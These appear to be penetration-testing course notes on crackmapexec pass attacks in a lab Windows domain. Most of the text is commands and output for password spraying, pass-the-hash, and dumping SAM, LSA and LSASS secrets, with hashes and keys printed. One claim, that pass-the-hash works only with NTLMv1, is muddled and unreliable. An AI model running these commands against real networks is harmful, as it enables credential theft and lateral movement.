# Pass Attacks

`crackmapexec` was preinstalled (either in Kali or through the `pimpmykali`
script). It offers a lot of functionality that goes way beyond the scope of
this course. To explore the full functionality we can use the command
`crackmapexec --help`, which basically just shows the supported protocols.
`crackmapexec smb --help` will then display the help information on the SMB
protocol, etc., which is quite extensive.



**Pass-the-password attack**

The following command sweeps the subnet defined by the given CIDR notation. The
options `-u`, `-d` and `-p` denote the user, domain and the known password. A
`[-]` indicates an unsuccessful login attempt, a `[+]` indicates a successful
login attempt, and `(Pwn3d!)` indicates that the account has local admin rights
on the respective machine. We can then try to exploit this access in a next
step, e.g. using `secretsdump.py`.

```
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 10.0.2.0/24 -u fcastle -d MARVEL.local -p Password1 
SMB         10.0.2.6        445    THEPUNISHER      [*] Windows 10 / Server 2019 Build 19041 x64 (name:THEPUNISHER) (domain:MARVEL.local) (signing:False) (SMBv1:False)
SMB         10.0.2.15       445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:MARVEL.local) (signing:True) (SMBv1:False)
SMB         10.0.2.4        445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:MARVEL.local) (signing:False) (SMBv1:False)
SMB         10.0.2.6        445    THEPUNISHER      [+] MARVEL.local\fcastle:Password1 (Pwn3d!)
SMB         10.0.2.15       445    HYDRA-DC         [+] MARVEL.local\fcastle:Password1 
SMB         10.0.2.4        445    SPIDERMAN        [+] MARVEL.local\fcastle:Password1 (Pwn3d!)
```



**Pass-the-hash attack**

A pass-the-hash attack works only with the `NTLMv1` protocol, not with `NLTLMv2`.
We do not need to crack the hash, it may even be uncrackable for us, but we can
still pass it around. In the following SAM dump, the `NTLM` hashes are stored
with the LM part first and the NT part second. We need to pass the entire
`NTLM` hash with the `-H` option and add the switch `--local-auth`.

```
┌──(kali㉿kali)-[~]
└─$ cat LLMNR_Poisoning/10.0.2.4_samhashes.sam
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:ecb2ddf6e131a81e61285c44d9358aaa:::
peterparker:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 10.0.2.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth
SMB         10.0.2.6        445    THEPUNISHER      [*] Windows 10 / Server 2019 Build 19041 x64 (name:THEPUNISHER) (domain:THEPUNISHER) (signing:False) (SMBv1:False)
SMB         10.0.2.4        445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:SPIDERMAN) (signing:False) (SMBv1:False)
SMB         10.0.2.15       445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:HYDRA-DC) (signing:True) (SMBv1:False)
SMB         10.0.2.6        445    THEPUNISHER      [+] THEPUNISHER\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         10.0.2.4        445    SPIDERMAN        [+] SPIDERMAN\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         10.0.2.15       445    HYDRA-DC         [-] HYDRA-DC\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE
```

We find that the same password (same hash!) works for the local `administrator`
account on both, `THEPUNISHER` and `SPIDERMAN`. This is very common in big
organizations, where the IT team have to service a lot of machines and are
often tempted to use the same credentials over and over again. If we can get
the password hash for this admin user, we have access to all machines on the
network, irrespective of the complexity of the password! We will do the same
with any password and any hash that we get hold of: pass it around.



**Enumerate SAM databases**

If we add the switch `--sam` to the previous command, the contents of the SAM
database will be dumped from every machine that we get admin access rights on.
These hash values will be stored in the `crackmapexec` database as well, as the
log below says at the end.

```
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 10.0.2.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --sam
SMB         10.0.2.6        445    THEPUNISHER      [*] Windows 10 / Server 2019 Build 19041 x64 (name:THEPUNISHER) (domain:THEPUNISHER) (signing:False) (SMBv1:False)
SMB         10.0.2.4        445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:SPIDERMAN) (signing:False) (SMBv1:False)
SMB         10.0.2.15       445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:HYDRA-DC) (signing:True) (SMBv1:False)
SMB         10.0.2.6        445    THEPUNISHER      [+] THEPUNISHER\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         10.0.2.4        445    SPIDERMAN        [+] SPIDERMAN\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         10.0.2.15       445    HYDRA-DC         [-] HYDRA-DC\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
SMB         10.0.2.6        445    THEPUNISHER      [+] Dumping SAM hashes
SMB         10.0.2.4        445    SPIDERMAN        [+] Dumping SAM hashes
SMB         10.0.2.6        445    THEPUNISHER      Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
SMB         10.0.2.4        445    SPIDERMAN        Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
SMB         10.0.2.6        445    THEPUNISHER      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.0.2.4        445    SPIDERMAN        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.0.2.6        445    THEPUNISHER      DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.0.2.4        445    SPIDERMAN        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.0.2.6        445    THEPUNISHER      WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:fd82b88db6c66dd3c2cef8f845ca2803:::
SMB         10.0.2.4        445    SPIDERMAN        WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:ecb2ddf6e131a81e61285c44d9358aaa:::
SMB         10.0.2.6        445    THEPUNISHER      frankcastle:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         10.0.2.6        445    THEPUNISHER      [+] Added 5 SAM hashes to the database
SMB         10.0.2.4        445    SPIDERMAN        peterparker:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         10.0.2.4        445    SPIDERMAN        [+] Added 5 SAM hashes to the database
```



**Enumerate Shares**

Instead of the `--sam` switch we can also add the `--shares` switch, which will
show all local file shares (not only the ones that we are connected to!).

```
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 10.0.2.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --shares
SMB         10.0.2.15       445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:HYDRA-DC) (signing:True) (SMBv1:False)
SMB         10.0.2.6        445    THEPUNISHER      [*] Windows 10 / Server 2019 Build 19041 x64 (name:THEPUNISHER) (domain:THEPUNISHER) (signing:False) (SMBv1:False)
SMB         10.0.2.4        445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:SPIDERMAN) (signing:False) (SMBv1:False)
SMB         10.0.2.15       445    HYDRA-DC         [-] HYDRA-DC\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
SMB         10.0.2.6        445    THEPUNISHER      [+] THEPUNISHER\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         10.0.2.4        445    SPIDERMAN        [+] SPIDERMAN\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         10.0.2.6        445    THEPUNISHER      [+] Enumerated shares
SMB         10.0.2.6        445    THEPUNISHER      Share           Permissions     Remark
SMB         10.0.2.6        445    THEPUNISHER      -----           -----------     ------
SMB         10.0.2.6        445    THEPUNISHER      ADMIN$          READ,WRITE      Remote Admin
SMB         10.0.2.6        445    THEPUNISHER      C$              READ,WRITE      Default share
SMB         10.0.2.6        445    THEPUNISHER      IPC$            READ            Remote IPC
SMB         10.0.2.4        445    SPIDERMAN        [+] Enumerated shares
SMB         10.0.2.4        445    SPIDERMAN        Share           Permissions     Remark
SMB         10.0.2.4        445    SPIDERMAN        -----           -----------     ------
SMB         10.0.2.4        445    SPIDERMAN        ADMIN$          READ,WRITE      Remote Admin
SMB         10.0.2.4        445    SPIDERMAN        C$              READ,WRITE      Default share
SMB         10.0.2.4        445    SPIDERMAN        IPC$            READ            Remote IPC
```



**Enumerate Local Secrets**

Using the `--lsa` switch instead of the `--shares` or `--sam` switches will
dump the LSA, which may contain other secrets than the SAM dumps. Some of these
secrets are valuable, others are not. The capture DCC2 passwords are stored
from the last login, which may have been some time ago, so that the password
may have been changed in the meantime. 

```
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 10.0.2.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --lsa   
SMB         10.0.2.4        445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:SPIDERMAN) (signing:False) (SMBv1:False)
SMB         10.0.2.15       445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:HYDRA-DC) (signing:True) (SMBv1:False)
SMB         10.0.2.6        445    THEPUNISHER      [*] Windows 10 / Server 2019 Build 19041 x64 (name:THEPUNISHER) (domain:THEPUNISHER) (signing:False) (SMBv1:False)
SMB         10.0.2.4        445    SPIDERMAN        [+] SPIDERMAN\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         10.0.2.15       445    HYDRA-DC         [-] HYDRA-DC\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
SMB         10.0.2.6        445    THEPUNISHER      [+] THEPUNISHER\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         10.0.2.4        445    SPIDERMAN        [+] Dumping LSA secrets
SMB         10.0.2.6        445    THEPUNISHER      [+] Dumping LSA secrets
SMB         10.0.2.4        445    SPIDERMAN        MARVEL.LOCAL/Administrator:$DCC2$10240#Administrator#c7154f935b7d1ace4c1d72bd4fb7889c: (2025-08-03 18:38:30+00:00)
SMB         10.0.2.6        445    THEPUNISHER      MARVEL.LOCAL/Administrator:$DCC2$10240#Administrator#c7154f935b7d1ace4c1d72bd4fb7889c: (2025-08-13 04:31:46+00:00)
SMB         10.0.2.6        445    THEPUNISHER      MARVEL.LOCAL/fcastle:$DCC2$10240#fcastle#e6f48c2526bd594441d3da3723155f6f: (2025-08-03 17:27:27+00:00)
SMB         10.0.2.4        445    SPIDERMAN        MARVEL\SPIDERMAN$:aes256-cts-hmac-sha1-96:a521036c562ddfa01bd87fc45e81b1f4d6a0bf674b909e327b3298f94198a67d                                                                                                                                                          
SMB         10.0.2.6        445    THEPUNISHER      MARVEL\THEPUNISHER$:aes256-cts-hmac-sha1-96:ddcc3c9b8dc4bac1e836f60ef909cb491342f4b4ed03dff68b2a9ac9e5fccf90                                                                                                                                                        
SMB         10.0.2.4        445    SPIDERMAN        MARVEL\SPIDERMAN$:aes128-cts-hmac-sha1-96:b4267987932dc7019749ce01fffaab6c
SMB         10.0.2.4        445    SPIDERMAN        MARVEL\SPIDERMAN$:des-cbc-md5:801cc729baf72994
SMB         10.0.2.4        445    SPIDERMAN        MARVEL\SPIDERMAN$:plain_password_hex:660057005d004c0024007a0073006e0053005d00760024004c002a0056005b004b0056002e0037002b00570045003a00460048002f002300450038003a0023004400480051005e006400290077003f00790021003f00200040004e005c003a0020004f00230067005700380070007900680043003f006400220032005e0054005d00710058003d006d007400280031006a005300710041002a00360064007900700032003800610064002d0030006500620042004a0077005d0056003e00320039006e006c002300750056004b005a005700220079004d004000380065006300760031006a006b0036003e0035007a00                                                       
SMB         10.0.2.4        445    SPIDERMAN        MARVEL\SPIDERMAN$:aad3b435b51404eeaad3b435b51404ee:1328c537e4ddf842c1456e4176112fdb:::
SMB         10.0.2.4        445    SPIDERMAN        dpapi_machinekey:0xc71286b734103cf91be8d2bb827f71564bd9670a
dpapi_userkey:0xb82bb65959427b2dcf15e8f26a5783149513427d                                                                                                    
SMB         10.0.2.6        445    THEPUNISHER      MARVEL\THEPUNISHER$:aes128-cts-hmac-sha1-96:565a3e21b9a72ae1d6f853619e4d7832
SMB         10.0.2.6        445    THEPUNISHER      MARVEL\THEPUNISHER$:des-cbc-md5:5e4934f8f1fb580d
SMB         10.0.2.6        445    THEPUNISHER      MARVEL\THEPUNISHER$:plain_password_hex:5a007900740052003500520066003500560036005600540036004900330034003f005b005b0023003f0042003a00230029006400770063006d0054003e003f0043006d003a003e00420071004a0062002800480047002d00350073003200640031007600500060007200540028006700530055006a0054004a0050003d00540031003f00240048007400480070007000560022002a0065002d00390061005d00280050003200690070003c0023003e004100520057003a0050002d00470035002000460022005c004f0022004c0021002000400041003300460062003b002e005700590022004e004a00770072002e00                                                     
SMB         10.0.2.6        445    THEPUNISHER      MARVEL\THEPUNISHER$:aad3b435b51404eeaad3b435b51404ee:a7310a9f64a8598773252ee0675e8aae:::
SMB         10.0.2.4        445    SPIDERMAN        NL$KM:2e5efc95c5db94063f3b4eddd653c4664ea38ca1cfe30a5eae8abc67392b5d5f7deac8603bd404fba0c96374793be1be8346b3dce8918f49b96f4e6f42ec4cff                                                                                                                              
SMB         10.0.2.4        445    SPIDERMAN        [+] Dumped 8 LSA secrets to /home/kali/.cme/logs/SPIDERMAN_10.0.2.4_2025-08-12_155925.secrets and /home/kali/.cme/logs/SPIDERMAN_10.0.2.4_2025-08-12_155925.cached
SMB         10.0.2.6        445    THEPUNISHER      dpapi_machinekey:0x70b810b6f3cea60a01c6a89983513809d549462f
dpapi_userkey:0x89d4bea229297fecdc2014e323945763f075a308                                                                                                    
SMB         10.0.2.6        445    THEPUNISHER      NL$KM:38e3a785c55877172f56ec298acf671dfa1bfdd7341960ca4ca7c86f2c6b9ec9a65c01ec71d107c73d5d70ece9c9a774ad34513326ab5a523bc9d33a14c79d86                                                                                                                              
SMB         10.0.2.6        445    THEPUNISHER      [+] Dumped 9 LSA secrets to /home/kali/.cme/logs/THEPUNISHER_10.0.2.6_2025-08-12_155925.secrets and /home/kali/.cme/logs/THEPUNISHER_10.0.2.6_2025-08-12_155925.cached
```

We can always try to crack DCC passwords with `hashcat`. If we can crack an old
hash, we may get the current password by simply exchanging a year, incrementing
a number at the end or adding the same special character one more time. (This
happens often in case of too frequent demands for password changes.)



**List available modules**

`crackmapexec smb -L` provides a list of all available modules for the SMB
protocol. There is even a tool to find `Keepass` database files, which can be
cracked offline (as reported by TCM).

```
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb -L                                                                                                                  
[*] bh_owned                  Set pwned computer as owned in Bloodhound
[*] dfscoerce                 Module to check if the DC is vulnerable to DFSCocerc, credit to @filip_dragovic/@Wh04m1001 and @topotam
[*] drop-sc                   Drop a searchConnector-ms file on each writable share
[*] empire_exec               Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
[*] enum_avproducts           Gathers information on all endpoint protection solutions installed on the the remote host(s) via WMI
[*] enum_dns                  Uses WMI to dump DNS from an AD DNS Server
[*] get_netconnections        Uses WMI to query network connections.
[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
[*] handlekatz                Get lsass dump using handlekatz64 and parse the result with pypykatz
[*] hash_spider               Dump lsass recursively from a given hash using BH to find local admins
[*] impersonate               List and impersonate tokens to run command as locally logged on users
[*] install_elevated          Checks for AlwaysInstallElevated
[*] ioxidresolver             Thie module helps you to identify hosts that have additional active interfaces
[*] keepass_discover          Search for KeePass-related files and process.
[*] keepass_trigger           Set up a malicious KeePass trigger to export the database in cleartext.
[*] lsassy                    Dump lsass and parse the result remotely with lsassy

(...)
```

Among these modules, `lsassy` should be our number 1. It prints out secrets
that are stored in the RAM of a machine. Unfortunately, the program crashes when
we run `lsassy` as demonstrated in TCM's video. His recommendation is to stop
the script with `<Ctrl-C>` if it hangs for a few seconds without results. (See
the screenshot of the `lsassy` module for a successful extraction of an `NTLM`
hash from the LSASS data in the RAM of the respective machine.)

```
┌──(kali㉿kali)-[~]
└─$ sudo crackmapexec smb 10.0.2.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth -M lsassy
SMB         10.0.2.6        445    THEPUNISHER      [*] Windows 10 / Server 2019 Build 19041 x64 (name:THEPUNISHER) (domain:THEPUNISHER) (signing:False) (SMBv1:False)
SMB         10.0.2.4        445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:SPIDERMAN) (signing:False) (SMBv1:False)
SMB         10.0.2.15       445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:HYDRA-DC) (signing:True) (SMBv1:False)
SMB         10.0.2.6        445    THEPUNISHER      [+] THEPUNISHER\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         10.0.2.4        445    SPIDERMAN        [+] SPIDERMAN\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         10.0.2.15       445    HYDRA-DC         [-] HYDRA-DC\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
Traceback (most recent call last):
  File "/usr/bin/crackmapexec", line 8, in <module>
    sys.exit(main())

(...)
```



**CME database**

The `crackmapexec` (CME) database can be opened with `cmedb`, `help` displays a
list of the available commands: `hosts` shows all hosts that have ever been
found with our version of CME, `creds` shows all found credentials. The
database can also be exported into a nicer format for our pentest report.

```
┌──(kali㉿kali)-[~]
└─$ cmedb                                                                                                                                    
cmedb (default)(smb) > help

Documented commands (type help <topic>):
========================================
help

Undocumented commands:
======================
back  creds  exit  export  groups  hosts  import  shares

cmedb (default)(smb) > creds

+Credentials---------+-----------+-------------+--------------------+-------------------------------------------------------------------+
| CredID | Admin On  | CredType  | Domain      | UserName           | Password                                                          |
+--------+-----------+-----------+-------------+--------------------+-------------------------------------------------------------------+
| 1      | 2 Host(s) | plaintext | MARVEL      | fcastle            | Password1                                                         |
| 2      | 1 Host(s) | hash      | THEPUNISHER | administrator      | 7facdc498ed1680c4fd1448319a8c04f                                  |
| 3      | 1 Host(s) | hash      | SPIDERMAN   | administrator      | 7facdc498ed1680c4fd1448319a8c04f                                  |
| 4      | 0 Host(s) | hash      | THEPUNISHER | Guest              | aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 |
| 5      | 0 Host(s) | hash      | SPIDERMAN   | Guest              | aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 |
| 6      | 0 Host(s) | hash      | THEPUNISHER | DefaultAccount     | aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 |
| 7      | 0 Host(s) | hash      | SPIDERMAN   | DefaultAccount     | aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 |
| 8      | 0 Host(s) | hash      | THEPUNISHER | WDAGUtilityAccount | aad3b435b51404eeaad3b435b51404ee:fd82b88db6c66dd3c2cef8f845ca2803 |
| 9      | 0 Host(s) | hash      | SPIDERMAN   | WDAGUtilityAccount | aad3b435b51404eeaad3b435b51404ee:ecb2ddf6e131a81e61285c44d9358aaa |
| 10     | 0 Host(s) | hash      | THEPUNISHER | frankcastle        | aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b |
| 11     | 0 Host(s) | hash      | SPIDERMAN   | peterparker        | aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b |
+--------+-----------+-----------+-------------+--------------------+-------------------------------------------------------------------+

cmedb (default)(smb) > hosts

+Hosts---+-----------+-----------+-------------+--------+--------------------------------------+-------+---------+
| HostID | Admins    | IP        | Hostname    | Domain | OS                                   | SMBv1 | Signing |
+--------+-----------+-----------+-------------+--------+--------------------------------------+-------+---------+
| 1      | 2 Cred(s) | 10.0.2.6  | THEPUNISHER | MARVEL | Windows 10 / Server 2019 Build 19041 | 0     | 0       |
| 2      | 0 Cred(s) | 10.0.2.15 | HYDRA-DC    | MARVEL | Windows Server 2022 Build 20348      | 0     | 1       |
| 3      | 2 Cred(s) | 10.0.2.4  | SPIDERMAN   | MARVEL | Windows 10 / Server 2019 Build 19041 | 0     | 0       |
+--------+-----------+-----------+-------------+--------+--------------------------------------+-------+---------+

cmedb (default)(smb) > shares

+---------+-------------+--------+---------------+-------------+--------------+
| ShareID | computer    | Name   | Remark        | Read Access | Write Access |
+---------+-------------+--------+---------------+-------------+--------------+
| 1       | THEPUNISHER | ADMIN$ | Remote Admin  | 1 User(s)   | 1 Users      |
| 2       | SPIDERMAN   | ADMIN$ | Remote Admin  | 1 User(s)   | 1 Users      |
| 3       | THEPUNISHER | C$     | Default share | 1 User(s)   | 1 Users      |
| 4       | SPIDERMAN   | C$     | Default share | 1 User(s)   | 1 Users      |
+---------+-------------+--------+---------------+-------------+--------------+

cmedb (default)(smb) >

(...)
```



### Further reading

* [CrackMapExec is Dead — Long Live NetExec!](https://medium.com/@mingihongkim/%EF%B8%8F-crackmapexec-is-dead-long-live-netexec-3c581dfc094d)
* [NetExec Project Wiki](https://www.netexec.wiki/)
* [Credential Dumping: Domain Cache Credential](https://www.hackingarticles.in/credential-dumping-domain-cache-credential/)
* [Hash Cracking: Difference between DCC2 and NTLM (Windows)](https://community.spiceworks.com/t/hash-cracking-difference-between-dcc2-and-ntlm-windows/961975)
* [What is the difference between a local account and a domain account](https://www.pisys.net/knowledge-base/microsoft-solutions/what-is-the-difference-between-a-local-account-and-a-domain-account/)
* [Types of user accounts in Windows 10 (local, domain, Microsoft)](https://www.infosecinstitute.com/resources/operating-system-security/types-of-user-accounts-in-windows-10-local-domain-microsoft/)



<!--
span style="color:green;font-weight:700;font-size:20px">
markdown color font styles
</span
-->
